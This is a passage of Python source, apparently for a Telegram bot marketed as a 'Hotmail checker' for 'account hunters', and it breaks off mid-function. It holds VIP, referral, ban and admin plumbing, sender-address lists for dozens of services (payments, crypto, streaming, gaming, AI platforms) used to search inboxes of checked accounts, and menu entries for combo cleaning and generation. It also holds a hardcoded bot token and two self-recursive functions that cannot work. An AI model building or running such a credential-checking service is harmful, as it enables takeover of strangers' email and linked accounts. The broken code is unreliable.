#ASSLAM ALIKUM 
"""
HOTMAIL CHECKER TELEGRAM BOT - ULTIMATE VERSION
Created by: @AraboMardelli
✅ TikTok Full Capture (VIP Only)
✅ AI Platforms Check (Free)
✅ Ban System
✅ Advanced Statistics
✅ Stop Button
✅ All Previous Features
"""

import telebot
from telebot import types
import sqlite3
import os
import time
import threading
import concurrent.futures
import datetime
import json
import requests
import uuid
import re
import urllib.parse
import random
import imaplib
import email as email_lib
from email.header import decode_header
from pathlib import Path
from io import BytesIO
from translations import t, get_lang, set_lang, load_languages, TRANSLATIONS
from user_stats import record_scan, record_inbox, get_user_stats, get_all_stats, get_top_users, get_global_stats

# TikTok Capture Module
USER_AGENTS_TIKTOK = [
    'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

def format_number(num):
    """Format large numbers"""
    if num >= 1000000:
        return f"{num/1000000:.1f}M"
    elif num >= 1000:
        return f"{num/1000:.1f}K"
    else:
        return str(num)

# Bot Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8542557681:AAGjUqgYMcfxUClZhT_gDE3h7fbTVIjNFeQ")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8139020487"))
MY_SIGNATURE = "@AraboMardelli"
CHANNEL = "https://t.me/+eHSyH6pSiHVjZjNi"

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=4)

user_sessions = {}
active_scans = {}
maintenance_mode = False

import queue

_db_lock = threading.Lock()
_scan_lock = threading.Lock()

def get_db():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    return conn

def safe_send(chat_id, text, **kwargs):
    for attempt in range(3):
        try:
            return bot.send_message(chat_id, text, **kwargs)
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                retry = int(e.result_json.get('parameters', {}).get('retry_after', 3))
                time.sleep(retry)
            else:
                raise
        except Exception:
            if attempt < 2:
                time.sleep(1)
            else:
                raise

def start_scan(user_id):
    with _scan_lock:
        if active_scans.get(user_id, False):
            return False
        active_scans[user_id] = True
        return True

def stop_scan(user_id):
    with _scan_lock:
        stop_scan(user_id)

def end_scan(user_id):
    with _scan_lock:
        end_scan(user_id)

# ── GROUP SUPPORT ──────────────────────────────────────────
ALLOWED_GROUPS_FILE = "allowed_groups.json"

def load_allowed_groups():
    try:
        with open(ALLOWED_GROUPS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_allowed_groups(groups):
    with open(ALLOWED_GROUPS_FILE, 'w') as f:
        json.dump(groups, f)

def is_allowed_group(chat_id):
    return chat_id in load_allowed_groups()

def add_allowed_group(chat_id):
    groups = load_allowed_groups()
    if chat_id not in groups:
        groups.append(chat_id)
        save_allowed_groups(groups)

def remove_allowed_group(chat_id):
    groups = load_allowed_groups()
    if chat_id in groups:
        groups.remove(chat_id)
        save_allowed_groups(groups)

def is_group_chat(message):
    return message.chat.type in ("group", "supergroup")

# ── IP / USER LOGGING ─────────────────────────────────────
USER_LOG_FILE = "user_log.json"

def log_user_activity(user_id, username, action, message=None):
    try:
        try:
            with open(USER_LOG_FILE, 'r') as f:
                logs = json.load(f)
        except:
            logs = {}
        uid = str(user_id)
        if uid not in logs:
            logs[uid] = {"username": username, "actions": [], "devices": []}
        logs[uid]["username"] = username
        device_info = None
        if message and hasattr(message, 'from_user') and message.from_user:
            lang = message.from_user.language_code or "unknown"
            device_info = f"lang:{lang}"
            if device_info not in logs[uid]["devices"]:
                logs[uid]["devices"].append(device_info)
        entry = {
            "action": action,
            "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "chat_type": message.chat.type if message else "unknown",
            "chat_id": message.chat.id if message else None,
        }
        if device_info:
            entry["device"] = device_info
        logs[uid]["actions"] = logs[uid]["actions"][-49:]
        logs[uid]["actions"].append(entry)
        with open(USER_LOG_FILE, 'w') as f:
            json.dump(logs, f, indent=2)
    except:
        pass

def get_user_log(user_id):
    try:
        with open(USER_LOG_FILE, 'r') as f:
            logs = json.load(f)
        return logs.get(str(user_id), None)
    except:
        return None

def get_all_user_logs():
    try:
        with open(USER_LOG_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

# Services Configuration
SERVICES_ALL = {
    # Social Media
    "Reddit": "Reddit",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",

    # Streaming
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "YouTube": "no-reply@youtube.com",

    # Gaming
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "Roblox": "accounts@roblox.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",

    # Finance
    "PayPal": "service@paypal.com.br",
    "Binance": "do-not-reply@ses.binance.com",
    "Coinbase": "no-reply@coinbase.com",

    # Shopping
    "Shein": "noreply@sheinnotice.com",
    "Limehome": "Limehome.com",
    "Check24": "Check24",
    "Lime": "no-reply@li.me",
}

SERVICES_GAMING = {
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "EA Sports": "EA@e.ea.com",
    "Ubisoft": "noreply@ubisoft.com",
    "Riot Games": "no-reply@riotgames.com",
    "Roblox": "accounts@roblox.com",
    "Minecraft": "noreply@mojang.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",
}

SERVICES_SOCIAL = {
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",
    "Discord": "noreply@discord.com",
}

SERVICES_STREAMING = {
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "HBO Max": "no-reply@hbomax.com",
    "Amazon Prime": "auto-confirm@amazon.com",
    "YouTube": "no-reply@youtube.com",
    "Twitch": "no-reply@twitch.tv",
}

# AI Platforms (Free for everyone)
SERVICES_AI = {
    "ChatGPT": "support@openai.com",
    "Claude AI": "support@anthropic.com",
    "Gemini": "ai-support@google.com",
    "DeepSeek": "support@deepseek.com",
    "Blackbox AI": "support@blackbox.ai",
    "Perplexity": "support@perplexity.ai",
    "Meta AI": "ai@meta.com",
    "Copilot": "copilot@microsoft.com",
    "Stability AI": "support@stability.ai",
}

# Shopping Platforms
SERVICES_SHOPPING = {
    "Shein": "noreply@sheinnotice.com",
    "Limehome": "Limehome.com",
    "Check24": "Check24",
    "Lime": "no-reply@li.me",
}

# Database Setup
def init_db():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    c = conn.cursor()

    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_vip INTEGER DEFAULT 0,
        vip_until TEXT,
        is_banned INTEGER DEFAULT 0,
        ban_reason TEXT,
        referral_code TEXT UNIQUE,
        referred_by INTEGER,
        referrals_count INTEGER DEFAULT 0,
        last_scan_time TEXT,
        total_scans INTEGER DEFAULT 0,
        total_hits INTEGER DEFAULT 0,
        join_date TEXT,
        trial_used INTEGER DEFAULT 0
    )''')

    try:
        c.execute("ALTER TABLE users ADD COLUMN trial_used INTEGER DEFAULT 0")
    except:
        pass

    # Scans history
    c.execute('''CREATE TABLE IF NOT EXISTS scans (
        scan_id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        scan_date TEXT,
        scan_mode TEXT,
        hits_count INTEGER,
        bad_count INTEGER,
        total_checked INTEGER
    )''')

    conn.commit()
    conn.close()

init_db()

# Database Helper Functions
def get_user(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def add_user(user_id, username):
    conn = get_db()
    c = conn.cursor()

    user = get_user(user_id)
    if not user:
        # Generate unique referral code
        referral_code = f"REF{user_id}"
        c.execute("""INSERT INTO users (user_id, username, referral_code, join_date) 
                     VALUES (?, ?, ?, ?)""", 
                  (user_id, username, referral_code, str(datetime.datetime.now())))
        conn.commit()
    conn.close()

def add_vip_hours(user_id, hours):
    """Add VIP hours (for referral system)"""
    conn = get_db()
    c = conn.cursor()

    user = get_user(user_id)
    if not user:
        return False

    current_vip = user[3]  # vip_until
    now = datetime.datetime.now()

    if current_vip == "Forever":
        new_vip = "Forever"
    elif current_vip:
        try:
            vip_date = datetime.datetime.strptime(current_vip, "%Y-%m-%d %H:%M:%S")
            if vip_date > now:
                # Extend existing VIP
                new_vip = vip_date + datetime.timedelta(hours=hours)
            else:
                # VIP expired, start new
                new_vip = now + datetime.timedelta(hours=hours)
        except Exception as e:
            print(f"[AddVIP] Error parsing VIP date for user {user_id}: {e}")
            new_vip = now + datetime.timedelta(hours=hours)
    else:
        # No VIP, start new
        new_vip = now + datetime.timedelta(hours=hours)

    vip_str = new_vip if new_vip == "Forever" else new_vip.strftime("%Y-%m-%d %H:%M:%S")
    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", 
              (vip_str, user_id))
    conn.commit()
    conn.close()
    try:
        membership = "Forever" if new_vip == "Forever" else "VIP"
        update_json_user(user_id, is_vip=True, vip_until=vip_str, membership=membership)
    except Exception:
        pass
    return True

def process_referral(new_user_id, referrer_user_id):
    """Process referral - Tiered VIP rewards"""
    if referrer_user_id == new_user_id:
        return False, "", ""

    conn = get_db()
    c = conn.cursor()

    new_user = get_user(new_user_id)
    if new_user and new_user[7]:
        conn.close()
        return False, "", ""

    c.execute("UPDATE users SET referred_by = ? WHERE user_id = ?",
              (referrer_user_id, new_user_id))
    c.execute("UPDATE users SET referrals_count = referrals_count + 1 WHERE user_id = ?",
              (referrer_user_id,))
    conn.commit()

    c.execute("SELECT referrals_count FROM users WHERE user_id = ?", (referrer_user_id,))
    row = c.fetchone()
    conn.close()

    ref_count = row[0] if row else 1

    # Tiered hourly reward
    if ref_count <= 3:
        hours = 6
        reward_text = "+6 Stunden VIP"
    elif ref_count <= 9:
        hours = 12
        reward_text = "+12 Stunden VIP"
    else:
        hours = 24
        reward_text = "+24 Stunden VIP"

    add_vip_hours(referrer_user_id, hours)

    # Milestone bonuses
    milestone_msg = ""
    if ref_count == 5:
        add_vip(referrer_user_id, "milestone", "3d")
        milestone_msg = "\n\n🏆 <b>MILESTONE!</b> 5 Referrals → +3 Tage Bonus!"
    elif ref_count == 10:
        add_vip(referrer_user_id, "milestone", "1w")
        milestone_msg = "\n\n🏆 <b>MILESTONE!</b> 10 Referrals → +1 Woche Bonus!"
    elif ref_count == 20:
        add_vip(referrer_user_id, "milestone", "1m")
        milestone_msg = "\n\n🏆 <b>MILESTONE!</b> 20 Referrals → +1 Monat Bonus!"

    return True, reward_text, milestone_msg

def is_banned(user_id):
    """Check if user is banned (checks both SQLite and JSON)"""
    if user_id == ADMIN_ID:
        return False

    user = get_user(user_id)
    if user and user[4] == 1:
        return True

    try:
        json_user = get_json_user(user_id)
        if json_user and json_user.get('is_banned'):
            return True
    except Exception:
        pass

    return False

def ban_user(user_id, reason="No reason provided"):
    """Ban a user (updates both SQLite and JSON)"""
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1, ban_reason = ? WHERE user_id = ?", 
              (reason, user_id))
    conn.commit()
    conn.close()
    try:
        update_json_user(user_id, is_banned=True)
    except Exception:
        pass

def unban_user(user_id):
    """Unban a user (updates both SQLite and JSON)"""
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0, ban_reason = NULL WHERE user_id = ?", 
              (user_id,))
    conn.commit()
    conn.close()
    try:
        update_json_user(user_id, is_banned=False)
    except Exception:
        pass

def get_banned_users():
    """Get list of banned users"""
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id, username, ban_reason FROM users WHERE is_banned = 1")
    banned = c.fetchall()
    conn.close()
    return banned

def is_vip(user_id):
    """Check if user is VIP (checks both SQLite and JSON)"""
    if user_id == ADMIN_ID:
        return True

    # Check SQLite first
    user = get_user(user_id)
    if user:
        is_vip_flag = user[2]
        vip_until = user[3]

        if is_vip_flag and is_vip_flag != 0:
            if vip_until == "Forever":
                return True
            if vip_until and vip_until.strip():
                try:
                    vip_str = vip_until.strip()
                    vip_date = None
                    for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M:%S.%f"):
                        try:
                            vip_date = datetime.datetime.strptime(vip_str, fmt)
                            break
                        except ValueError:
                            continue
                    if vip_date and datetime.datetime.now() < vip_date:
                        return True
                    else:
                        conn = get_db()
                        c = conn.cursor()
                        c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
                        conn.commit()
                        conn.close()
                        try:
                            update_json_user(user_id, is_vip=False, vip_until=None, membership="Free")
                        except Exception:
                            pass
                except Exception:
                    pass
            else:
                conn = get_db()
                c = conn.cursor()
                c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
                conn.commit()
                conn.close()
                try:
                    update_json_user(user_id, is_vip=False, vip_until=None, membership="Free")
                except Exception:
                    pass

    # Also check JSON database
    try:
        json_user = get_json_user(user_id)
        if json_user:
            if json_user.get('is_vip'):
                jvip_until = json_user.get('vip_until')
                if jvip_until == "Forever":
                    return True
                if jvip_until:
                    try:
                        jvip_str = str(jvip_until).strip()
                        vip_date = None
                        for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M:%S.%f"):
                            try:
                                vip_date = datetime.datetime.strptime(jvip_str, fmt)
                                break
                            except ValueError:
                                continue
                        if vip_date and datetime.datetime.now() < vip_date:
                            return True
                    except Exception:
                        pass
            if json_user.get('membership') == 'Forever':
                return True
    except Exception:
        pass

    return False

def is_vip_forever(user_id):
    """Check if user has FOREVER VIP (for TikTok Full Capture)"""
    if user_id == ADMIN_ID:
        return True

    user = get_user(user_id)
    if not user:
        return False

    vip_until = user[3]
    return vip_until == "Forever"

def can_scan(user_id):
    """Check if user can scan"""
    if is_vip(user_id):
        return True, None

    user = get_user(user_id)
    if not user or not user[6]:  # last_scan_time
        return True, None

    try:
        last_scan = datetime.datetime.strptime(user[6], "%Y-%m-%d %H:%M:%S")
        now = datetime.datetime.now()
        diff = (now - last_scan).total_seconds()

        if diff >= 3600:
            return True, None
        else:
            remaining = int(3600 - diff)
            minutes = remaining // 60
            seconds = remaining % 60
            return False, f"{minutes}m {seconds}s"
    except:
        return True, None

def update_last_scan(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET last_scan_time = ? WHERE user_id = ?", 
              (str(datetime.datetime.now()), user_id))
    conn.commit()
    conn.close()

def add_vip(user_id, username, duration):
    """Add VIP membership"""
    conn = get_db()
    c = conn.cursor()

    user = get_user(user_id)
    if not user:
        add_user(user_id, username)

    if duration == "Forever" or duration == "forever":
        vip_until = "Forever"
    else:
        now = datetime.datetime.now()
        if duration == "1h":
            vip_until = now + datetime.timedelta(hours=1)
        elif duration == "1d":
            vip_until = now + datetime.timedelta(days=1)
        elif duration == "3d":
            vip_until = now + datetime.timedelta(days=3)
        elif duration == "1w":
            vip_until = now + datetime.timedelta(weeks=1)
        elif duration == "1m":
            vip_until = now + datetime.timedelta(days=30)
        else:
            vip_until = "Forever"

        if vip_until != "Forever":
            vip_until = vip_until.strftime("%Y-%m-%d %H:%M:%S")

    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", 
              (vip_until, user_id))
    conn.commit()
    conn.close()
    try:
        membership = "Forever" if vip_until == "Forever" else "VIP"
        update_json_user(user_id, is_vip=True, vip_until=vip_until, membership=membership)
    except Exception:
        pass

def remove_vip(user_id):
    """Remove VIP (updates both SQLite and JSON)"""
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET is_vip = 0, vip_until = NULL WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    try:
        update_json_user(user_id, is_vip=False, vip_until=None, membership="Free")
    except Exception:
        pass

def get_all_vips():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id, username, vip_until FROM users WHERE is_vip = 1")
    vips = c.fetchall()
    conn.close()
    return vips

def get_free_users():
    """Get list of free users"""
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id, username FROM users WHERE is_vip = 0 AND is_banned = 0")
    free_users = c.fetchall()
    conn.close()
    return free_users

def update_stats(user_id, hits, bad, total, scan_mode="standard"):
    conn = get_db()
    c = conn.cursor()

    c.execute("UPDATE users SET total_scans = total_scans + 1, total_hits = total_hits + ? WHERE user_id = ?", 
              (hits, user_id))

    c.execute("INSERT INTO scans (user_id, scan_date, scan_mode, hits_count, bad_count, total_checked) VALUES (?, ?, ?, ?, ?, ?)",
              (user_id, datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), scan_mode, hits, bad, total))

    conn.commit()
    conn.close()

def main_menu_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)

    btn1 = types.KeyboardButton(t(user_id, "btn_start_scan"))
    btn2 = types.KeyboardButton(t(user_id, "btn_multi_scan"))
    btn3 = types.KeyboardButton(t(user_id, "btn_my_stats"))
    btn4 = types.KeyboardButton(t(user_id, "btn_membership"))
    btn5 = types.KeyboardButton(t(user_id, "btn_referral"))
    btn6 = types.KeyboardButton(t(user_id, "btn_support"))
    btn_cleaner = types.KeyboardButton(t(user_id, "btn_combo_cleaner"))
    btn_mailcheck = types.KeyboardButton(t(user_id, "btn_mail_extractor"))
    btn_inbox_single = types.KeyboardButton(t(user_id, "btn_single_inbox"))
    btn_inbox_multi = types.KeyboardButton(t(user_id, "btn_multi_inbox"))
    btn_ryd = types.KeyboardButton("🚗 RYD Inboxen")
    btn_limehome = types.KeyboardButton("🏨 Limehome Inboxen")
    btn_amazon = types.KeyboardButton("📦 Amazon Inboxen")
    btn_paypal = types.KeyboardButton("💰 PayPal Inboxen")
    btn_uber = types.KeyboardButton("🚕 Uber Inboxen")
    btn_lieferando = types.KeyboardButton("🍕 Lieferando Inboxen")
    btn_booking = types.KeyboardButton("✈️ Booking Inboxen")
    btn_zalando = types.KeyboardButton("👗 Zalando Inboxen")
    btn_lime = types.KeyboardButton("🛴 Lime Inboxen")
    btn_payback = types.KeyboardButton("💳 PAYBACK Inboxen")
    btn_db = types.KeyboardButton("🚆 DB Inboxen")
    btn_dhl = types.KeyboardButton("📦 DHL Inboxen")
    btn_otto = types.KeyboardButton("🛒 Otto Inboxen")
    btn_ebay = types.KeyboardButton("🏷️ eBay Inboxen")
    btn_netflix = types.KeyboardButton("🎬 Netflix Inboxen")
    btn_spotify = types.KeyboardButton("🎵 Spotify Inboxen")
    btn_check24 = types.KeyboardButton("✅ Check24 Inboxen")
    btn_shein = types.KeyboardButton("👠 SHEIN Inboxen")
    btn_flixbus = types.KeyboardButton("🚌 FlixBus Inboxen")
    btn_flaschenpost = types.KeyboardButton("🍾 Flaschenpost Inboxen")
    btn_mcdonalds = types.KeyboardButton("🍔 McDonald's Inboxen")
    btn_combogen = types.KeyboardButton(t(user_id, "btn_combo_gen"))
    btn_redeem = types.KeyboardButton("🔑 Redeem Key")

    btn_history = types.KeyboardButton(t(user_id, "btn_scan_history"))
    btn_reload = types.KeyboardButton(t(user_id, "btn_reload"))
    btn_lang = types.KeyboardButton(t(user_id, "btn_language"))

    all_btns = [btn1, btn2, btn3, btn4, btn5, btn6, btn_cleaner, btn_mailcheck,
                btn_inbox_single, btn_inbox_multi,
                btn_ryd, btn_limehome, btn_lime, btn_amazon, btn_paypal, btn_uber,
                btn_lieferando, btn_booking, btn_zalando, btn_payback, btn_db,
                btn_dhl, btn_otto, btn_ebay, btn_netflix, btn_spotify,
                btn_check24, btn_shein, btn_flixbus, btn_flaschenpost, btn_mcdonalds,
                btn_combogen, btn_redeem, btn_history, btn_lang, btn_reload]

    if user_id == ADMIN_ID:
        btn7 = types.KeyboardButton(t(user_id, "btn_admin"))
        all_btns.append(btn7)

    markup.add(*all_btns)

    return markup

# Scan Mode Selection
def scan_mode_keyboard(user_id):
    """Enhanced scan mode with Check One Account and Instagram Full"""
    markup = types.InlineKeyboardMarkup(row_width=1)

    btn1 = types.InlineKeyboardButton("1️⃣ All Services", callback_data="scan_all")
    btn2 = types.InlineKeyboardButton("2️⃣ Select Single Platform", callback_data="scan_single_platform")
    btn3 = types.InlineKeyboardButton("3️⃣ Gaming Platforms", callback_data="scan_gaming")
    btn4 = types.InlineKeyboardButton("4️⃣ Social Media", callback_data="scan_social")
    btn5 = types.InlineKeyboardButton("5️⃣ Streaming Services", callback_data="scan_streaming")
    btn6 = types.InlineKeyboardButton("6️⃣ PSN Detailed", callback_data="scan_psn")
    btn7 = types.InlineKeyboardButton("7️⃣ Custom Domain", callback_data="scan_custom")
    btn8 = types.InlineKeyboardButton("8️⃣ AI Platforms (Free)", callback_data="scan_ai")

    # TikTok Full Capture - VIP FOREVER Only
    if is_vip_forever(user_id):
        btn9 = types.InlineKeyboardButton("9️⃣ TikTok Full Capture (VIP Forever)", callback_data="scan_tiktok")
    else:
        btn9 = types.InlineKeyboardButton("🔒 TikTok Full (VIP Forever Only)", callback_data="vip_forever_required")

    # NEW: Check One Account
    btn10 = types.InlineKeyboardButton("🔟 Check One Account", callback_data="scan_check_one")

    # NEW: Instagram Full Capture - VIP only
    if is_vip(user_id):
        btn11 = types.InlineKeyboardButton("1️⃣1️⃣ Instagram Full Capture (VIP)", callback_data="scan_instagram_full")
    else:
        btn11 = types.InlineKeyboardButton("🔒 Instagram Full (VIP Only)", callback_data="vip_required")

    btn12 = types.InlineKeyboardButton("🛍️ Shopping (Shein & mehr)", callback_data="scan_shopping")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11, btn12)

    btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="back_main")
    markup.add(btn_back)

    return markup


def single_platform_keyboard():
    """Platform selection keyboard - ALL platforms from source"""
    markup = types.InlineKeyboardMarkup(row_width=3)

    # Get ALL unique platforms from all service categories
    all_platforms = {}

    # Add from SERVICES_ALL
    for name, email in SERVICES_ALL.items():
        all_platforms[name] = email

    # Add from SERVICES_GAMING (if not already present)
    for name, email in SERVICES_GAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Add from SERVICES_SOCIAL
    for name, email in SERVICES_SOCIAL.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Add from SERVICES_STREAMING
    for name, email in SERVICES_STREAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Add from SERVICES_AI
    for name, email in SERVICES_AI.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Add from SERVICES_SHOPPING
    for name, email in SERVICES_SHOPPING.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Create buttons for all platforms (sorted alphabetically)
    platform_buttons = []
    for platform_name in sorted(all_platforms.keys()):
        # Create simple button with platform name
        btn_text = platform_name
        btn_data = f"platform_{platform_name}"
        platform_buttons.append(types.InlineKeyboardButton(btn_text, callback_data=btn_data))

    # Add buttons in rows of 3
    for i in range(0, len(platform_buttons), 3):
        row = platform_buttons[i:i+3]
        markup.row(*row)

    # Back button
    back_btn = types.InlineKeyboardButton("◀️ Back", callback_data="back_to_scan_modes")
    markup.add(back_btn)

    return markup

def get_mode_description(mode):
    """Get detailed description for each scan mode"""
    descriptions = {
        "all": """
⚡ <b>ALL SERVICES SCAN</b>

📝 <b>Description:</b>
Check ALL linked accounts across 60+ platforms

🎯 <b>Supported Platforms:</b>
• 📱 Social: Facebook, Instagram, TikTok, Twitter, LinkedIn
• 🎮 Gaming: Steam, Xbox, PSN, Epic, Free Fire, PUBG, Konami
• 📺 Streaming: Netflix, Spotify, Disney+, Hulu, HBO Max
• 💰 Finance: PayPal, Binance, Coinbase
• And 40+ more!

⏱ <b>Estimated Time:</b> Medium-Long
🎯 <b>Best For:</b> Complete account analysis
""",
        "gaming": """
⚡ <b>GAMING PLATFORMS SCAN</b>

📝 <b>Description:</b>
Check gaming accounts only - faster & focused

🎮 <b>Supported Platforms:</b>
• Steam, Xbox, PlayStation, Epic Games
• EA Sports, Ubisoft, Riot Games
• Roblox, Minecraft
• Free Fire, PUBG Mobile, Konami

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Gaming account hunters
""",
        "social": """
⚡ <b>SOCIAL MEDIA SCAN</b>

📝 <b>Description:</b>
Check social media accounts only

📱 <b>Supported Platforms:</b>
• Facebook, Instagram, TikTok
• Twitter, LinkedIn, Snapchat
• Discord, Reddit

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Social media hunters
""",
        "streaming": """
⚡ <b>STREAMING SERVICES SCAN</b>

📝 <b>Description:</b>
Check streaming & entertainment

📺 <b>Supported Platforms:</b>
• Netflix, Spotify, Disney+
• Hulu, HBO Max, Amazon Prime
• YouTube Premium, Twitch

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Entertainment hunters
""",
        "psn": """
⚡ <b>PSN DETAILED SCAN</b>

📝 <b>Description:</b>
Deep PlayStation Network analysis

🎯 <b>What You Get:</b>
• PSN verification
• Order history
• Online ID extraction
• Account region

⏱ <b>Estimated Time:</b> Medium
🎯 <b>Best For:</b> PlayStation focus
""",
        "custom": """
⚡ <b>CUSTOM DOMAIN SCAN</b>

📝 <b>Description:</b>
Search for ANY service by domain

🔍 <b>How It Works:</b>
Provide domain (e.g., netflix.com)
Bot searches emails from that domain

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Specific services
""",
        "ai": """
⚡ <b>AI PLATFORMS SCAN</b> 🆕

📝 <b>Description:</b>
Check AI platform accounts (FREE!)

🤖 <b>Supported Platforms:</b>
• ChatGPT (OpenAI)
• Claude AI (Anthropic)
• Gemini (Google)
• DeepSeek AI
• Blackbox AI
• Perplexity AI
• Meta AI (LLaMA)
• Microsoft Copilot
• Stability AI

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> AI account hunters
💎 <b>Status:</b> FREE for everyone!
""",
        "tiktok": """
⚡ <b>TIKTOK FULL CAPTURE</b> 🆕

📝 <b>Description:</b>
Complete TikTok account data extraction

🎯 <b>What You Get:</b>
• TikTok Username
• Followers Count
• Following Count
• Total Videos
• Total Likes
• Profile Bio
• Verification Status
• Account Creation Date

⏱ <b>Estimated Time:</b> Medium
🎯 <b>Best For:</b> TikTok hunters
👑 <b>Status:</b> VIP ONLY
""",
        "shopping": """
⚡ <b>SHOPPING SCAN</b> 🆕

📝 <b>Description:</b>
Check shopping platform accounts

🛍️ <b>Supported Platforms:</b>
• Shein (noreply@sheinnotice.com)
• Amazon Prime
• eBay
• AliExpress

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Shopping account hunters
"""
    }

    return descriptions.get(mode, "")

# Admin Panel
def admin_panel_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)

    # VIP Management
    btn1 = types.InlineKeyboardButton("➕ Add VIP", callback_data="admin_add_vip")
    btn2 = types.InlineKeyboardButton("➖ Remove VIP", callback_data="admin_remove_vip")
    btn3 = types.InlineKeyboardButton("📋 List VIPs", callback_data="admin_list_vips")

    # Ban Management
    btn4 = types.InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban_user")
    btn5 = types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban_user")
    btn6 = types.InlineKeyboardButton("📋 Banned List", callback_data="admin_banned_list")

    btn7 = types.InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")
    btn8 = types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    btn9 = types.InlineKeyboardButton("🔑 Generate Key", callback_data="admin_generate_key")
    btn_userstats = types.InlineKeyboardButton("👤 User Stats", callback_data="admin_user_stats")
    btn_topusers = types.InlineKeyboardButton("🏆 Top Users", callback_data="admin_top_users")
    btn_maintenance = types.InlineKeyboardButton("🔧 Maintenance Mode", callback_data="admin_maintenance")
    btn_groups = types.InlineKeyboardButton("👥 Gruppen", callback_data="admin_groups")
    btn_userlog = types.InlineKeyboardButton("📋 User Logs", callback_data="admin_user_logs")
    btn_active_scans = types.InlineKeyboardButton("🔍 Aktive Scans", callback_data="admin_active_scans")
    btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="back_main")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn_userstats, btn_topusers, btn_maintenance, btn_groups, btn_userlog, btn_active_scans, btn_back)
    return markup

# VIP Duration Selection
def vip_duration_keyboard():
